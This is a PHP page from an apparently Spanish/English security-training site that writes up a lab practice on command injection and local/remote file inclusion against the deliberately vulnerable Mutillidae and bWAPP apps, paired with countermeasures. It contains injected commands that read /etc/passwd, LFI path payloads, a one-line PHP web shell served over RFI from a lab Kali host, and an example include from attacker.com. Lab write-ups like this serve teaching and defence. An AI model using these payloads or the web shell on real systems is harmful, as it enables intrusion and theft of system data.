<?php
/**
 * CyberEscudo — Proyecto: Inyección de Comandos y RFI/LFI
 * Contenido: Práctica 2.4 — Sergio Belmonte Morales
 */
require_once __DIR__ . '/../bootstrap.php';

$pageTitle    = $lang === 'es' ? 'Inyección de Comandos y RFI/LFI — CyberEscudo' : 'Command Injection & RFI/LFI — CyberEscudo';
$contentTitle = $lang === 'es' ? 'Inyección de Comandos y RFI/LFI' : 'Command Injection & RFI/LFI';
$contentDate  = '2022-02-01';
$contentTags  = ['Command Injection', 'RFI', 'LFI', 'Pentesting', 'OWASP'];

ob_start();
if ($lang === 'es'): ?>
<div class="prose">
  <p>Práctica sobre explotación y mitigación de vulnerabilidades de inyección de comandos y de inclusión de archivos locales/remotos (LFI/RFI), usando las plataformas OWASP Mutillidae y bWAPP.</p>

  <h2>1. Inyección de Comandos</h2>
  <p>Accedemos a <strong>OWASP Mutillidae</strong> y navegamos hasta:<br>
  <code>OWASP 2013 → A1 – Injection (other) → Command Injection → DNS Lookup</code></p>

  <p>Desde el campo de entrada podemos inyectar comandos del sistema operativo encadenándolos con el separador <code>;</code> o <code>|</code>. Ejemplos de reconocimiento:</p>

  <pre><code># Ver directorio actual
pwd

# Listar todos los usuarios del sistema
cat /etc/passwd

# Listar archivos (incluyendo ocultos) del directorio actual
ls -la

# Ver configuración de Apache
ls /etc/apache2/

# Buscar usuarios de bases de datos activos
grep -i '(postgres|sql|db2|ora)' /etc/passwd

# Verificar procesos de base de datos en ejecución
ps -eaf | egrep -l '(postgres|sql|db2|ora)'

# Listar módulos de Apache activos
apachectl -M

# Listar módulos de Apache disponibles
ls /etc/apache2/mods-available/</code></pre>

  <h2>2. Contramedidas para Inyección de Comandos</h2>

  <ol>
    <li><strong>Lista blanca de valores permitidos.</strong> Validar la entrada solo contra valores conocidos y seguros.</li>
    <li><strong>Validar que la entrada sea un número</strong> cuando el contexto lo permita.</li>
    <li><strong>Permitir solo caracteres alfanuméricos,</strong> sin espacios, puntos o caracteres especiales.</li>
    <li><strong>Usar funciones integradas en lugar de comandos del SO.</strong> Por ejemplo, usar <code>unlink($file)</code> de PHP en lugar de llamar a <code>rm</code> del sistema.</li>
    <li><strong>Usar <code>filter_input</code> de PHP</strong> para validar la entrada antes de usarla:</li>
  </ol>

  <pre><code>&lt;?php
if ($targetIP = filter_input(INPUT_GET, 'ip', FILTER_VALIDATE_IP)) {
    $cmd = exec("ping $targetIP");
} else {
    die("Por favor, introduce una dirección IP válida");
}
?&gt;</code></pre>

  <ol start="6">
    <li><strong>Evitar completamente</strong> las funciones <code>exec()</code>, <code>shell_exec()</code>, <code>system()</code> y <code>passthru()</code>.</li>
    <li><strong>No confiar en <code>strip_tags()</code></strong> como método de desinfección de entradas.</li>
  </ol>

  <h2>3. LFI / RFI (Local & Remote File Inclusion)</h2>
  <p>Accedemos a la máquina <strong>bWAPP</strong> y seleccionamos:<br>
  <code>Remote & Local File Inclusion (RFI/LFI)</code></p>

  <p>Mediante la manipulación del parámetro <code>language=</code> en la URL, podemos incluir archivos locales del servidor:</p>

  <pre><code># Obtener el nombre de la máquina
?language=/etc/hostname

# Listar todos los usuarios del sistema
?language=/etc/passwd

# Ver los grupos del sistema
?language=/etc/group

# Ver la configuración de Apache
?language=/etc/apache2/apache2.conf</code></pre>

  <h2>4. Bindshell con RFI</h2>
  <p>Si el servidor tiene <code>allow_url_include=On</code>, podemos alojar un archivo PHP malicioso en nuestra máquina Kali y ejecutarlo remotamente:</p>

  <pre><code># Activamos Apache en Kali para servir el archivo
service apache2 start

# Creamos el archivo bind.shell.txt en /var/www/html/ con este contenido:
# &lt;?php system($_GET['comando']); ?&gt;

# Lo incluimos desde bWAPP y ejecutamos comandos:
http://10.0.2.4/bWAPP/rlfi.php?language=http://10.0.2.7/bind.shell.txt&action=go&comando=ls

# Listar archivos del directorio actual
&comando=ls

# Ver todos los procesos activos
&comando=ps

# Listar hardware del sistema
&comando=lshw

# Ver módulos del kernel cargados
&comando=lsmod

# Ver dispositivos PCI
&comando=lspci

# Ver usuarios activos en el sistema
&comando=w

# Ver archivos abiertos por procesos
&comando=lsof</code></pre>

  <h2>5. Contramedidas RFI/LFI</h2>

  <ol>
    <li><strong>Deshabilitar <code>allow_url_include</code> y <code>allow_url_fopen</code></strong> en <code>php.ini</code> para bloquear la inclusión de archivos remotos:</li>
  </ol>
  <pre><code>; php.ini
allow_url_include = Off
allow_url_fopen   = Off</code></pre>

  <ol start="2">
    <li><strong>Restringir permisos de escritura</strong> en carpetas del servidor para impedir la subida de archivos maliciosos.</li>
    <li><strong>Usar condiciones preestablecidas</strong> (un mapa de archivos permitidos) en lugar de usar directamente la entrada del usuario como nombre de archivo:</li>
  </ol>
  <pre><code>&lt;?php
$allowed = ['en' => 'lang/en.php', 'es' => 'lang/es.php'];
$lang = $_GET['language'] ?? 'es';
$file = $allowed[$lang] ?? $allowed['es'];
include $file;
?&gt;</code></pre>
</div>

<?php else: ?>
<div class="prose">
  <p>Practice on exploiting and mitigating command injection and local/remote file inclusion (LFI/RFI) vulnerabilities using OWASP Mutillidae and bWAPP.</p>

  <h2>1. Command Injection</h2>
  <p>Access <strong>OWASP Mutillidae</strong> → OWASP 2013 → A1 Injection → DNS Lookup. Inject OS commands using <code>;</code> or <code>|</code>:</p>
  <pre><code>pwd
cat /etc/passwd
ls -la
ls /etc/apache2/</code></pre>

  <h2>2. Countermeasures</h2>
  <pre><code>&lt;?php
if ($targetIP = filter_input(INPUT_GET, 'ip', FILTER_VALIDATE_IP)) {
    $cmd = exec("ping $targetIP");
} else {
    die("Please provide a valid IP address");
}
?&gt;</code></pre>
  <ul>
    <li>Avoid <code>exec()</code>, <code>shell_exec()</code>, <code>system()</code>, <code>passthru()</code></li>
    <li>Use whitelist validation</li>
    <li>Use built-in PHP functions instead of OS commands</li>
  </ul>

  <h2>3. LFI / RFI</h2>
  <pre><code>?language=/etc/passwd
?language=/etc/hostname
?language=http://attacker.com/shell.txt&comando=id</code></pre>

  <h2>4. Countermeasures</h2>
  <pre><code>; php.ini
allow_url_include = Off
allow_url_fopen   = Off</code></pre>
  <ul>
    <li>Use a whitelist map instead of raw user input for file names</li>
    <li>Restrict write permissions on server directories</li>
  </ul>
</div>
<?php endif;
$contentBody = ob_get_clean();
require __DIR__ . '/../templates/content-page.php';
